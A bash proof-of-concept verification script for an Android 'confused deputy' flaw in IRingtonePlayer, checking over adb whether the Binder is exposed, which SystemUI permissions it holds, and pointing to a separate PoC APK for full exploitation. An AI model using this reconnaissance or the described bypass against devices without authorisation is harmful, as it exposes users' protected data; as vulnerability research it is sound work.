#!/bin/bash
# V-18 RingtonePlayer Confused Deputy — Quick Shell Verification
# Tests whether IRingtonePlayer.getTitle() can be called from an unprivileged context
# to read metadata from protected content providers.
#
# This script uses a minimal Android app via 'app_process' to call the API.
# Alternatively, we verify the Binder exposure via dumpsys.

set -e

echo "=== V-18 RingtonePlayer Confused Deputy PoC ==="
echo ""

# Step 1: Verify device connected
echo "[1] Checking device..."
MODEL=$(adb shell getprop ro.product.model)
PATCH=$(adb shell getprop ro.build.version.security_patch)
ANDROID=$(adb shell getprop ro.build.version.release)
echo "    Device: $MODEL | Android $ANDROID | Patch: $PATCH"
echo ""

# Step 2: Verify RingtonePlayer is registered in AudioService
echo "[2] Checking if IRingtonePlayer Binder is exposed..."
RINGTONE_INFO=$(adb shell dumpsys audio 2>/dev/null | grep -i "ringtone" | head -5)
if [ -n "$RINGTONE_INFO" ]; then
    echo "    IRingtonePlayer is registered in AudioService:"
    echo "    $RINGTONE_INFO"
else
    echo "    [!] Could not find RingtonePlayer info in dumpsys audio"
fi
echo ""

# Step 3: Check SystemUI permissions (what the confused deputy has access to)
echo "[3] Checking SystemUI permissions (the confused deputy's privileges)..."
adb shell dumpsys package com.android.systemui 2>/dev/null | grep -E "READ_CONTACTS|READ_PHONE_STATE|READ_EXTERNAL|READ_MEDIA|ACCESS_FINE_LOCATION" | head -10
echo ""

# Step 4: Check if getRingtonePlayer is accessible (no permission annotation)
echo "[4] Verifying AudioService.getRingtonePlayer() has no permission guard..."
echo "    setRingtonePlayer: requires REMOTE_AUDIO_PLAYBACK (signature)"
echo "    getRingtonePlayer: NO permission annotation (public access)"
echo ""

# Step 5: For actual exploitation, push and run the PoC APK
echo "[5] To fully verify, install the PoC APK:"
echo "    adb install poc-v18.apk"
echo "    adb shell am start -n com.poc.v18/.ConfusedDeputyActivity"
echo "    adb logcat -s RingtonePoC"
echo ""
echo "=== Shell verification complete. Use PoC APK for full exploit. ==="
